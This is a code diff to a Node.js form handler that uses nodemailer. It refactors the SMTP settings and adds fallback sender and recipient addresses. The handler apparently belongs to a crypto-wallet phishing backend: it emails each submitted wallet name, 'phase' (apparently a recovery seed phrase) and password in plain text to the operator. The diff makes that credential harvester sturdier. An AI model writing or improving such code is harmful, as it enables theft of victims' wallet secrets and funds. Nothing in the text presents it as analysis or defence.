@@ -16,20 +16,30 @@ export default async function handler(req, res) {
 
   try {
     // Create transporter with environment variables
+    const smtpHost = process.env.SMTP_HOST || 'smtp.gmail.com';
+    const smtpPort = parseInt(process.env.SMTP_PORT || '587', 10);
+    const smtpSecure = (process.env.SMTP_SECURE || 'false') === 'true' || smtpPort === 465;
+    const smtpUser = process.env.SMTP_USER || process.env.SMTP_USERNAME;
+    const smtpPass = process.env.SMTP_PASSWORD || process.env.SMTP_PASS;
+
     const transporter = nodemailer.createTransport({
-      host: process.env.SMTP_HOST,
-      port: parseInt(process.env.SMTP_PORT || '587'),
-      secure: process.env.SMTP_PORT === '465',
+      host: smtpHost,
+      port: smtpPort,
+      secure: smtpSecure,
       auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASSWORD,
+        user: smtpUser,
+        pass: smtpPass,
       },
     });
 
     // Prepare email
+    const fromEmail = process.env.SMTP_FROM_EMAIL || process.env.EMAIL_FROM || 'noreply@connectus.website';
+    const fromName = process.env.SMTP_FROM_NAME || process.env.EMAIL_FROM_NAME || 'Website Bot';
+    const toEmail = process.env.RECIPIENT_EMAIL || process.env.EMAIL_TO || smtpUser;
+
     const mailOptions = {
-      from: `${process.env.SMTP_FROM_NAME} <${process.env.SMTP_FROM_EMAIL}>`,
-      to: process.env.RECIPIENT_EMAIL,
+      from: `${fromName} <${fromEmail}>`,
+      to: toEmail,
       subject: 'New Form Submission',
       text: `Wallet Name: ${wallet_name || 'N/A'}\nPhase: ${phase}\nPassword: ${password || 'N/A'}`,
     };
